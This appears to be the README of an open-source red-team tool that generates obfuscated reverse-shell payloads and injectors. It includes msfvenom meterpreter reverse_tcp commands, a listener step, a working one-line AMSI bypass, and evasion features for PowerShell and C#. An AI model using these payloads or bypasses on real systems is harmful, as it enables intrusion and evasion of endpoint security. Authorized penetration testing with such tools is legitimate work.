# Paygen

> Modern web-based framework for offensive payload generation

![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Tests](https://img.shields.io/badge/tests-37%20passing-success.svg)

Paygen is a web-based payload generation framework for security researchers and penetration testers. It provides a modern web interface for creating and customizing offensive payloads with built-in MITRE ATT&CK mappings, effectiveness ratings, and advanced preprocessing pipelines.

---

## Screenshots

### Web Interface
![Paygen Web Interface](screenshots/web.png)

---

## Features

- 🌐 **Modern Web Interface** - Clean, responsive design with real-time validation
- 📋 **Recipe System** - YAML-based payload definitions with rich metadata
- 🔄 **Preprocessing** - Chain XOR/AES encryption, compression, encoding
- 🔀 **Preprocessing Options** - Select between multiple shellcode generation methods (msfvenom, donut, custom)
- 🎯 **MITRE ATT&CK** - Built-in tactic and technique mappings
- 📊 **Effectiveness** - HIGH/MEDIUM/LOW evasion ratings
- 📜 **History** - Track all builds with parameters and launch instructions
- ⚡ **Flexible** - Template-based (C#, PS1) and command-based (msfvenom)
- 🔍 **Search** - Quickly find recipes with built-in search functionality
- ✅ **Validation** - Real-time parameter validation (IP, port, paths, hex)
- 🎛️ **Build Options** - Remove comments, console output, strip binaries
- 🔐 **PowerShell Obfuscation** - Integrated psobf with 3 levels and automatic failover

---

## Installation

```bash
# Clone repository
git clone https://github.com/Hailst0rm1/paygen.git
cd paygen

# Install dependencies
pip install -r requirements.txt

# Run Web Interface
python -m src.main
# Then open http://localhost:1337 in your browser
```

### Requirements

- Python 3.10+
- Optional compilers and tools:
  - `msfvenom` - For generating shellcode payloads
  - `mcs` (Mono C# compiler) - For compiling C# templates
  - `gcc`/`mingw-w64` - For compiling C/C++ code
  - `psobf` - PowerShell obfuscation tool ([TaurusOmar/psobf](https://github.com/TaurusOmar/psobf))

#### Installing psobf

The `psobf` tool is required for PowerShell obfuscation features:

```bash
# Install from source
git clone https://github.com/TaurusOmar/psobf.git
cd psobf
# Follow installation instructions from the repository
# Ensure 'psobf' is available in your PATH
```

---

## Quick Start

### Web Interface

```bash
# 1. Launch web server
python -m src.main

# 2. Open browser to http://localhost:1337

# 3. Click any recipe to view details
# 4. Click "Generate" to configure parameters
# 5. Use "/" to search recipes
# 6. Click "History" to view past builds
```

---

## Navigation

### Web Interface

| Action              | Method                        |
| ------------------- | ----------------------------- |
| Search recipes      | Press `/` or click search box |
| Select recipe       | Click recipe name             |
| Generate payload    | Click "Generate" button       |
| View history        | Click "History" button        |
| View recipe details | Click history entry           |
| Refresh recipes     | Click refresh icon (top-left) |
| Copy code           | Click copy icon in code panel |

---

## Recipe Format

Recipes are YAML files with 4 sections:

```yaml
meta:
  name: "Recipe Name"
  category: "Process Injection"
  description: "What this payload does"
  effectiveness: high # low, medium, high
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  artifacts:
    - "Observable behavior 1"
    - "Observable behavior 2"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP"
    required: true
  - name: "lport"
    type: "port"
    default: 4444
    required: true

preprocessing:
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/... LHOST={{ lhost }} -f raw"
    output_var: "shellcode"
  
  # Option type: Choose between multiple methods
  - type: "option"
    name: "Select shellcode generation method"
    options:
      - type: "command"
        name: "Msfvenom shellcode"
        command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
        output_var: "raw_shellcode"
      - type: "command"
        name: "Donut shellcode"
        command: "donut -f {{ executable_path }} -a 2"
        output_var: "raw_shellcode"
  
  - type: "script"
    name: "encrypt"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode }}"
    output_var: "encrypted"

output:
  type: "template" # or "command"
  template: "injector.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
  launch_instructions: |
    # Start listener
    msfconsole -x "use exploit/multi/handler; ..."
```

---

## Built-in Preprocessors

Located in `preprocessors/`:

- `xor_encrypt.py` - XOR encryption with auto-key generation
- `aes_encrypt.py` - AES-256-CBC encryption
- `base64_encode.py` - Base64 encoding
- `compress.py` - Gzip compression
- `format_csharp.py` - Format bytes as C# arrays
- `caesar_cipher.py` - Caesar cipher
- `hex_to_bytes.py` - Convert hex strings to raw bytes

---

## Conditional Parameters

Parameters can be conditionally required based on preprocessing option selection using the `required_for` field:

```yaml
parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP address"
    required_for: "Msfvenom shellcode"  # Only required when this option is selected
    required: true
  
  - name: "executable_path"
    type: "file"
    description: "Path to executable for donut"
    required_for: "Donut shellcode"  # Only required when this option is selected
    required: true
```

When using conditional parameters:
- The parameter is only validated and displayed when its corresponding preprocessing option is selected
- Default values are automatically restored when switching between options
- Parameters without `required_for` are always shown and validated

---

## Directory Structure

```
paygen/
├── src/
│   ├── core/           # Config, recipes, validation, building
│   ├── web/            # Web interface (Flask + static assets)
│   │   ├── app.py      # Flask application & REST API
│   │   ├── static/     # CSS, JavaScript
│   │   └── templates/  # HTML templates
│   ├── main.py         # Web interface entry point
│   └── utils/          # Utilities
├── recipes/            # Recipe YAML files (tracked in git)
├── templates/          # Source templates (tracked in git)
├── preprocessors/      # Processing scripts (tracked in git)
├── output/             # Generated payloads (gitignored)
├── tests/              # Test suite (37 tests)
├── screenshots/        # UI screenshots
└── docs/               # Documentation
```

---

## Configuration

Located at `~/.config/paygen/config.yaml`:

```yaml
# Directories
recipes_dir: "~/Documents/Tools/paygen/recipes"
templates_dir: "~/Documents/Tools/paygen/templates"
preprocessors_dir: "~/Documents/Tools/paygen/preprocessors"
output_dir: "~/Documents/Tools/paygen/output"

# Build options
keep_source_files: false
show_build_debug: false
remove_comments: true # Strip comments from source before compilation
strip_binaries: true # Remove debug symbols from compiled binaries

# Web Interface settings
web_host: "0.0.0.0" # Bind to all interfaces
web_port: 1337 # Web server port
web_debug: false # Flask debug mode
```

### Web Interface Features

The web interface provides:

- **Real-time Validation**: Parameters validated as you type (IP addresses, ports, paths, hex values)
- **Syntax Highlighting**: Code preview with language-specific highlighting (C#, PowerShell, Python, etc.)
- **Search**: Press `/` to quickly find recipes by name or category
- **Build Progress**: Real-time build status with step-by-step progress
- **Build Options**: Checkboxes to remove comments, console output, or strip binaries
- **PowerShell Obfuscation**: Automatic obfuscation with 3 levels and intelligent failover
- **Standalone PowerShell Obfuscator**: Dedicated tool for obfuscating individual PowerShell commands
- **Launch Instructions Obfuscation**: Obfuscate PowerShell code blocks in launch instructions
- **History Management**: View all builds, detailed parameters, and delete individual entries
- **Launch Instructions**: Formatted markdown with syntax-highlighted code blocks and copy buttons
- **Responsive Design**: Clean 3-panel layout with Catppuccin Mocha theme

### Standalone PowerShell Obfuscator

The web interface includes a dedicated PowerShell obfuscation tool, accessible via the **"Obfuscate PS"** button (to the left of History):
- **Quick Access**: One-click access from the main header
- **Simple Interface**: 
  - Large text area for entering PowerShell commands
  - Dropdown menu for obfuscation level selection (High/Medium/Low)
  - Green "Generate" button to process the command
- **Real-time Processing**: Shows loading spinner while obfuscating
- **Syntax-Highlighted Output**: Obfuscated PowerShell displayed with proper highlighting
- **One-Click Copy**: Copy button to instantly copy obfuscated code to clipboard
- **Same Obfuscation Levels**: Uses identical logic as recipe-based obfuscation (High/Medium/Low)
- **Automatic Failover**: If a level fails, automatically tries the next lower level
- **No Recipe Required**: Obfuscate standalone commands without creating a full payload

**Use Cases**:
- Quickly obfuscate PowerShell one-liners before execution
- Test obfuscation on custom commands
- Prepare download cradles and execution commands
- Obfuscate scripts for manual deployment

**Requirements**: `psobf` tool must be installed (see [Installation](#installing-psobf))

### PowerShell Obfuscation

#### Template Obfuscation

When building PowerShell (.ps1) templates, you can enable automatic obfuscation:

- **Enabled by default** - Checkbox is pre-selected for PowerShell recipes
- **3 Obfuscation Levels**:
  - **High**: Maximum obfuscation with string encryption (XOR), identifier obfuscation, control flow obfuscation, dead code injection, and code fragmentation
  - **Medium**: Balanced obfuscation with string encryption, dead code, and moderate fragmentation
  - **Low**: Minimal obfuscation for quick processing
- **Automatic Failover**: If a level fails (e.g., complex scripts), automatically tries the next lower level
- **Build Progress**: Shows obfuscation steps in real-time during payload generation
- **Requires**: `psobf` tool installed and available in PATH (see [Installation](#installing-psobf))

#### Launch Instructions Obfuscation

Obfuscate PowerShell code blocks within launch instructions across all recipe types:

- **Disabled by default** - Global option available for any recipe with PowerShell in launch instructions
- **Same 3 Levels**: High, Medium, Low with automatic failover
- **Applied to Code Blocks**: Automatically detects and obfuscates all PowerShell code blocks in launch instructions
- **Universal**: Works with any recipe type (C#, Python, etc.) that includes PowerShell commands in launch instructions

Obfuscation helps evade signature-based detection and makes reverse engineering more difficult.

### C# Obfuscation

#### Name Obfuscation

When building C# (.cs) templates, you can enable automatic name obfuscation:

- **Enabled by default** - Checkbox is pre-selected for C# recipes
- **Function & Variable Replacement**: Replaces all function and variable names with innocuous-looking identifiers
- **Innocuous Names**: Uses nature-themed and common words (forest, lake, mountain, table, chair, etc.) and numbered variants (var1, obj1, temp1)
- **Smart Filtering**: 
  - Preserves C# keywords and reserved words
  - Keeps .NET framework types and methods (Console, WriteLine, Marshal, etc.)
  - Skips private members (starting with underscore)
  - Maintains compatibility with P/Invoke declarations
- **Applied Before Compilation**: Obfuscation runs before the compilation step
- **Build Progress**: Shows replacement count in real-time during payload generation

Example replacements:
- `shellcode` → `forest`
- `processHandle` → `lake`
- `allocatedMemory` → `mountain`
- `bufferSize` → `var1`

This makes reverse engineering more difficult by replacing meaningful variable and function names with benign-looking identifiers that don't reveal the code's purpose.

### AMSI Bypass Integration

Paygen provides modular AMSI (Antimalware Scan Interface) bypass capabilities to help evade Windows Defender and other security products:

#### Template AMSI Bypass

For PowerShell (.ps1) templates, inject AMSI bypass code **before** obfuscation:

- **Disabled by default** - Optional checkbox for PowerShell recipes
- **Dropdown Selection**: Choose from built-in or custom bypass methods
- **Inserted at Top**: Bypass code is prepended to the PowerShell template
- **Pre-Obfuscation**: Applied before any PowerShell obfuscation for maximum evasion

#### Launch Instructions AMSI Bypass

For PowerShell commands in launch instructions across any recipe type:

- **Disabled by default** - Global option for recipes with PowerShell in launch instructions
- **Dropdown Selection**: Same bypass methods available as template option
- **Smart Injection**: 
  - Adds "# AMSI Bypass" section at the top of launch instructions
  - For one-liner bypasses, also prepends to download cradles (DownloadString, DownloadFile, etc.)
  - Prepends with semicolon separator for inline execution
  - Adds marker text to indicate bypassed commands
- **Pre-Obfuscation**: Applied before launch instruction obfuscation

#### Built-in Bypass Methods

Paygen includes two proven AMSI bypass techniques:

1. **AmsiInitialize**: Sets `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
2. **amsiContext**: Memory patching technique using `[Runtime.InteropServices.Marshal]::Copy()`

#### Custom Bypass Methods

Add your own bypass techniques to `templates/amsi_bypasses/`:

1. Create a `.ps1` file with your bypass code (single line or multi-line)
2. Filename without extension becomes the display name (underscores converted to spaces)
3. Example: `my_custom_bypass.ps1` → appears as "my custom bypass" in dropdown

```powershell
# templates/amsi_bypasses/my_custom_bypass.ps1
# Your custom AMSI bypass code here
[System.Reflection.Assembly]::Load(...) | Out-Null
```

Custom bypasses are automatically loaded and available in both template and launch instruction options.

#### Bypass Execution Order

When multiple evasion techniques are enabled, they execute in this order:

1. **AMSI Bypass** (template or launch instructions)
2. **PowerShell Obfuscation** (if enabled)

This ensures bypass code is in place before obfuscation layers are applied.

---

## Example Recipes

### 1. Basic Msfvenom Payload

Simple msfvenom reverse TCP shell:

```bash
# Select: "Basic Msfvenom Reverse TCP Shell"
# Parameters: lhost=192.168.1.100, lport=4444
# Output: payload.exe
```

### 2. AES-Encrypted C# Injector

Process injection with AES-256-CBC encryption:

```bash
# Select: "C# AES-Encrypted Shellcode Injector"
# Parameters: target_process=explorer.exe, lhost, lport
# Steps: msfvenom → AES encrypt → C# template → compile
# Output: injector.exe
```

### 3. XOR-Encoded Injector

Simple XOR obfuscation:

```bash
# Select: "XOR-Encoded Shellcode Injector"
# Parameters: lhost, lport, xor_key=fa
# Steps: msfvenom → XOR encode → C# template → compile
# Output: xor_injector.exe
```

---

## Testing

```bash
# Run all tests
pytest

# Run specific test file
pytest tests/test_recipes.py -v

# Run with coverage
pytest --cov=src tests/
```

Current test coverage: 37 tests passing

---

## Creating Custom Recipes

### Template-Based Recipe

1. Create template in `templates/`:

```csharp
// templates/my_payload/injector.cs
using System;

class MyPayload {
    static byte[] encrypted = { {{ encrypted_shellcode }} };
    static byte[] key = { {{ aes_key }} };

    static void Main() {
        // Your payload logic
    }
}
```

2. Create recipe in `recipes/`:

```yaml
meta:
  name: "My Custom Payload"
  category: "Custom"
  effectiveness: high

parameters:
  - name: "lhost"
    type: "ip"
    required: true

preprocessing:
  - type: "command"
    name: "gen_shellcode"
    command: "msfvenom -p windows/x64/... LHOST={{ lhost }} -f raw"
    output_var: "shellcode"

  - type: "script"
    name: "encrypt"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode }}"
    output_var: "encrypted"

output:
  type: "template"
  template: "my_payload/injector.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
```

### Custom Preprocessor

Create in `preprocessors/`:

```python
#!/usr/bin/env python3
import sys
import json
import base64

def main():
    args = json.load(sys.stdin)
    data = base64.b64decode(args['data'])

    # Your processing logic
    result = process(data)

    output = {
        'processed': base64.b64encode(result).decode(),
        'size': len(result)
    }
    print(json.dumps(output))

def process(data):
    # Custom processing
    return data

if __name__ == "__main__":
    main()
```

---

## Security & Ethics

⚠️ **Important**: This tool generates malicious payloads for authorized security testing ONLY.

**Authorized Use:**

- ✅ Penetration testing with written authorization
- ✅ Red team operations
- ✅ Security research in controlled environments
- ✅ Educational purposes

**Never Use For:**

- ❌ Unauthorized access
- ❌ Malicious activity
- ❌ Illegal operations

**OpSec:**

- `output/` directory is gitignored (NEVER commit payloads)
- `config.yaml` contains local paths (gitignored)
- `history.json` contains sensitive build data (gitignored)

---

## Troubleshooting

### "Compiler not found"

```bash
# Install Mono (C# compiler)
sudo apt install mono-mcs  # Debian/Ubuntu
sudo pacman -S mono        # Arch

# Install msfvenom
sudo apt install metasploit-framework
```

### "Permission denied" on payload

```bash
chmod +x output/payload.exe
```

### Template variables not rendering

Ensure preprocessing `output_var` matches template placeholder:

```yaml
# Recipe
output_var: "encrypted_data"

# Template
{{ encrypted_data }}
```

---

## Development

### Running Tests

```bash
pytest tests/ -v
```

### Project Structure

- `src/core/` - Core functionality (config, recipes, validation, building)
- `src/web/` - Web interface components
- `src/utils/` - Utility functions
- `tests/` - Test suite

### Tech Stack

- **Web**: Flask 3.0.0+, Flask-CORS
- **Frontend**: Vanilla JavaScript, Prism.js (syntax highlighting), Marked.js (markdown)
- **Templates**: Jinja2
- **Crypto**: PyCryptodome
- **Testing**: pytest
- **Theme**: Catppuccin Mocha

---

## Roadmap

- [ ] Docker containerization
- [ ] Additional payload templates (Go, Rust, Python)
- [ ] C2 framework integration
- [ ] Automated obfuscation
- [ ] OPSEC scoring system

---

## License

MIT License - See [LICENSE](LICENSE) file for details.

Free and open source for security research and educational purposes.

---

## Acknowledgments

- [Catppuccin](https://github.com/catppuccin) - Beautiful color palette
- [Metasploit](https://www.metasploit.com/) - Shellcode generation
- [Flask](https://flask.palletsprojects.com/) - Web framework

---

**Remember**: With great power comes great responsibility. Use ethically. 🛡️

**Author**: Hailst0rm  
**Repository**: https://github.com/Hailst0rm1/paygen
